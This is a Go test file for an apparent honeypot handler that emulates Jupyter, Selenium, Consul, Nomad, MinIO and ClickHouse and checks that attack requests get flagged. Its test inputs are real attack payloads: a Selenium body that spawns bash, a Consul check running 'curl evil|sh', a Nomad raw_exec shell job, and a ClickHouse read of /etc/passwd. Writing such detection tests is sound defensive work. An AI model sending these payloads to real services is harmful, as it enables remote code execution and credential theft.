package handler

import (
	"strings"
	"testing"
)

func TestJupyterUnauthAndKernelSpawn(t *testing.T) {
	res, reply := runHTTPish(t, &cloudsvc{kind: "jupyter"}, "GET / HTTP/1.1\r\nHost: x\r\n\r\n")
	if !strings.Contains(reply, "JupyterLab") {
		t.Errorf("jupyter landing missing: %q", reply)
	}
	for _, w := range []string{"jupyter-probe", "jupyter-unauth-access"} {
		if !containsStr(anoms(res), w) {
			t.Errorf("anomalies=%v want %q", anoms(res), w)
		}
	}
	res, _ = runHTTPish(t, &cloudsvc{kind: "jupyter"}, httpPost("/api/kernels", "application/json", `{"name":"python3"}`))
	if !containsStr(anoms(res), "jupyter-kernel-spawn") {
		t.Errorf("anomalies=%v want jupyter-kernel-spawn", anoms(res))
	}
}

func TestSeleniumNodeRCE(t *testing.T) {
	body := `{"capabilities":{"alwaysMatch":{"goog:chromeOptions":{"binary":"/bin/bash","args":["-c","id"]}}}}`
	res, _ := runHTTPish(t, &cloudsvc{kind: "selenium"}, httpPost("/wd/hub/session", "application/json", body))
	for _, w := range []string{"selenium-session-create", "selenium-node-rce"} {
		if !containsStr(anoms(res), w) {
			t.Errorf("anomalies=%v want %q", anoms(res), w)
		}
	}
}

func TestConsulServiceRegisterRCE(t *testing.T) {
	body := `{"Name":"x","Check":{"Args":["/bin/sh","-c","curl evil|sh"],"Interval":"10s"}}`
	res, _ := runHTTPish(t, &cloudsvc{kind: "consul"}, "PUT /v1/agent/service/register HTTP/1.1\r\nHost: x\r\nContent-Length: "+itoa(len(body))+"\r\n\r\n"+body)
	if !containsStr(anoms(res), "consul-service-register-rce") {
		t.Errorf("anomalies=%v want consul-service-register-rce", anoms(res))
	}
}

func TestNomadRawExecRCE(t *testing.T) {
	body := `{"Job":{"TaskGroups":[{"Tasks":[{"Driver":"raw_exec","Config":{"command":"/bin/sh"}}]}]}}`
	res, _ := runHTTPish(t, &cloudsvc{kind: "nomad"}, httpPost("/v1/jobs", "application/json", body))
	if !containsStr(anoms(res), "nomad-job-submit-rce") {
		t.Errorf("anomalies=%v want nomad-job-submit-rce", anoms(res))
	}
}

func TestMinioBootstrapCVE(t *testing.T) {
	res, _ := runHTTPish(t, &cloudsvc{kind: "minio"}, httpPost("/minio/bootstrap/v1/verify", "application/json", ""))
	if !containsStr(anoms(res), "minio-bootstrap-verify") {
		t.Errorf("anomalies=%v want minio-bootstrap-verify", anoms(res))
	}
	if !containsStr(res.CVEHits, "CVE-2023-28432") {
		t.Errorf("CVEHits=%v want CVE-2023-28432", res.CVEHits)
	}
}

func TestClickHouseFileRead(t *testing.T) {
	res, _ := runHTTPish(t, &cloudsvc{kind: "clickhouse"}, "GET /?query=SELECT%20*%20FROM%20file('/etc/passwd') HTTP/1.1\r\nHost: x\r\n\r\n")
	for _, w := range []string{"clickhouse-sql-exec", "clickhouse-file-read"} {
		if !containsStr(anoms(res), w) {
			t.Errorf("anomalies=%v want %q", anoms(res), w)
		}
	}
}

func TestClickHousePingBenign(t *testing.T) {
	res, reply := runHTTPish(t, &cloudsvc{kind: "clickhouse"}, "GET / HTTP/1.1\r\nHost: x\r\n\r\n")
	if !strings.Contains(reply, "Ok.") {
		t.Errorf("clickhouse ping = %q", reply)
	}
	if containsStr(anoms(res), "clickhouse-sql-exec") {
		t.Errorf("bare ping wrongly flagged as sql-exec: %v", anoms(res))
	}
}
